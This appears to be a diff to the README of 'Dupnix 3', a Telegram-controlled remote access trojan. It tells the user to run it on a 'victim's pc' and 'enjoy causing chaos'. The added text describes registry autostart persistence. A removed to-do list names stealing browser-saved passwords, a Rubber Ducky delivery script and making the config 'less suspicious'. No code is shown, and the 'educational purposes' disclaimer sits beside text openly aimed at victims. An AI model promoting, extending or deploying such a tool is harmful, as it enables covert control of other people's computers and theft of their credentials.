@@ -45,22 +45,17 @@ Dupnix communicates to you through telegram, so nobody can detect who's on the o
 ### Instalation on victim's pc
 - Just run executable (in same directory as json file) and enjoy causing chaos!
 ## Usage
-
+#### Autostart
+* Dupnix is copied to the path specified in `dupnix-config.json` and is being added to autostart through Registry
 #### Syntax u send on the telegram channel
  * `<ID> <Command> <Parameters>`
 
 ### [Commands](commands.md)
-## Todo
-- [ ]  make readme look better
-- [ ]  first run of dupnix with args to chat_id and botid
-- [ ]  when there is no ID give it random one
-- [ ]  prepare rubber ducky script
-- [ ]  change dupnix-config.json to something less suspicious
-- [ ]  web browser saved passwords
+
 ## Contribution
 If you wanna do something then - contribute, please text me before that (my discord is in my bio) so we can work together!
 ## Why Dupnix 3?
-* Why Dupnix 3 is called Dupnix 3? On one of cash machines in my town there is sign DUPNIX, that's all.
+Why Dupnix 3 is called Dupnix 3? On one of cash machines in my town there is sign DUPNIX, that's all.
 
 ## Disclaimer
 Whole this project is only for eductional purposes, I am not responsible for anything you did or will do with this software.
